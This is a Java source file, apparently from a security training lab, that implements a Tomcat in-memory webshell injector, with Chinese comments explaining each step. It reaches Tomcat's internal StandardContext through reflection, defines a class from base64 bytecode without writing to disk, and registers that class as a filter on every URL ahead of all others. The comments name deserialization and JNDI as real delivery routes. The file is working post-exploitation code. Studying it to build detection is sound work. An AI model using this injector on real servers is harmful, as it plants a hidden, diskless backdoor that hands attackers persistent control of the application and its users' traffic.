package lab;

import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.Filter;
import javax.servlet.ServletContext;
import javax.servlet.http.HttpServletRequest;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;

/*
 * 注入器：把一段字节码注册成 Tomcat 的 Filter，插到请求链链首。
 *
 * 三个动作对应原理里的三件事：
 *   context()  —— 反射绕过 ServletContext 的门面，拿到真正持有注册表
 *                 的 StandardContext（运行时 addFilter 会被 Lifecycle 校验拒绝）
 *   defineClass —— 从 byte[] 定义类，不写磁盘、不进任何 jar，因此 CodeSource 为 null
 *   addFilterDef / addFilterMapBefore / filterStart —— 改容器堆里的注册表并立刻生效
 *
 * 真实利用里 byte[] 来自反序列化流 / JNDI / 请求体；本靶场由宿主机 poc 通过
 * HTTP 参数送进 /__lab/inject，用这个端点模拟「已经拿到任意代码执行」。
 */
public final class MemShellInject {

    public static final String FILTER_NAME = "lab-probe-filter";

    private MemShellInject() {
    }

    private static Object field(Object o, String name) throws Exception {
        Field f = o.getClass().getDeclaredField(name);
        f.setAccessible(true);
        return f.get(o);
    }

    /*
     * ApplicationContextFacade.context -> ApplicationContext
     * ApplicationContext.context       -> StandardContext
     * 写成循环是为了不假定起始对象是门面还是 ApplicationContext，也不假定层数。
     */
    public static StandardContext context(ServletContext sc) throws Exception {
        Object o = sc;
        int guard = 0;
        while (!(o instanceof StandardContext)) {
            if (++guard > 8) {
                throw new IllegalStateException("cannot reach StandardContext from " + sc.getClass());
            }
            o = field(o, "context");
        }
        return (StandardContext) o;
    }

    public static String inject(HttpServletRequest request, String b64) throws Exception {
        StandardContext ctx = context(request.getServletContext());

        byte[] bytes = Base64.getDecoder().decode(b64);
        Method define = ClassLoader.class.getDeclaredMethod(
                "defineClass", String.class, byte[].class, int.class, int.class);
        define.setAccessible(true);
        Class<?> clz = (Class<?>) define.invoke(
                Thread.currentThread().getContextClassLoader(), null, bytes, 0, bytes.length);
        Filter evil = (Filter) clz.newInstance();

        FilterDef def = new FilterDef();
        def.setFilterName(FILTER_NAME);
        def.setFilterClass(clz.getName());
        def.setFilter(evil);
        ctx.addFilterDef(def);

        FilterMap map = new FilterMap();
        map.setFilterName(FILTER_NAME);
        map.addURLPattern("/*");
        ctx.addFilterMapBefore(map);
        ctx.filterStart();

        return clz.getName() + " codeSource=" + clz.getProtectionDomain().getCodeSource();
    }
}
